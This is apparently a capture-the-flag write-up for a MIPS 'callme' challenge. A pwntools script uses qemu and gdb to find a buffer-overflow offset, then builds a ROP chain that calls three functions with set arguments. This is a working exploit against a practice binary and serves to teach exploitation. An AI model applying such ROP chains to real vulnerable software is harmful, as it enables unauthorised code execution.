# Callme

## Target
call `callme_one`, `callme_two` and `callme_three` in this order with the following arguments: `0xdeaedbeef`, `0xcafebabe` and `0xd00df00d`.

## The vuln
A buffer overflow allows ROPchain creation and execution. By using `ropper` or similar tools is possible to find gadgets which allows to correctly set the arguments and call the functions `callme_one`, `callme_two` and `callme_three` in sequence.

## The script
```python
from pwn import *
import subprocess
from threading import Thread

#
# Context
#

e = context.binary = ELF('callme_mipsel')
context.arch = 'mips'

#
# Offset
#

PORT = 1234
LIBDIR = '/usr/mipsel'

def qemu_thread():
    with subprocess.Popen(['/usr/bin/qemu-mipsel', '-L', LIBDIR, '-g', str(PORT), e.path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as qemu:
        qemu.stdin.write(cyclic(0x200))
        sleep(1)
        qemu.stdin.write(b'\n')

Thread(target=qemu_thread).start()

commands = f"""set arch mips:isa32
symbol-file callme_mipsel
target remote :{PORT}
b *pwnme+204
c
i r ra
q
"""
with open("command_file", "w") as cf:
    cf.write(commands)

with subprocess.Popen(['/usr/bin/gdb-multiarch', '--command=command_file', '--batch'], stdout=subprocess.PIPE, stderr=subprocess.PIPE) as gdb:
    gdb.wait()
    _, _, ra = gdb.stdout.read().split(b'\n')[-2].decode().partition(": ")

info(f'RA: {ra}')
offset = cyclic_find(bytes.fromhex(ra[2:]))
info(f'Offset: {offset}')

#
# ROP
#

# Alternative: use "ropper"
CALLME_ONE   = p32(e.plt["callme_one"])
CALLME_TWO   = p32(e.plt["callme_two"])
CALLME_THREE = p32(e.plt["callme_three"])
EXIT         = p32(e.plt["exit"])

# Calling convention (a0, a1, a2)
BIGPOP = p32(next(e.search(asm('lw $a0, 0x10($sp); lw $a1, 0xc($sp); lw $a2, 8($sp); lw $t9, 4($sp); jalr $t9; nop;'))))

SET_PARAMETERS  = b''
SET_PARAMETERS += p32(0xd00df00d)
SET_PARAMETERS += p32(0xcafebabe)
SET_PARAMETERS += p32(0xdeadbeef)

#
# Exploit
#

io = process(e.path)

payload =  b''
payload += b'A' * offset
payload += b'Por' # Di "Porco dio se lo stack non si allinea!"

payload += BIGPOP
payload += b'A' * 4 # Junk (delay branch?)
payload += CALLME_ONE
payload += SET_PARAMETERS

#MIPS: MIcroprocessorPorcoilSignore

payload += BIGPOP
payload += b'A' * 4
payload += CALLME_TWO
payload += SET_PARAMETERS

payload += BIGPOP
payload += b'A' * 4
payload += CALLME_THREE
payload += SET_PARAMETERS

payload += EXIT
payload += p32(0)

with open('payload', 'wb') as fout:
    fout.write(payload)

io.sendlineafter(b'> ', payload)

info(io.recvuntil(b'}').decode())
io.close()
```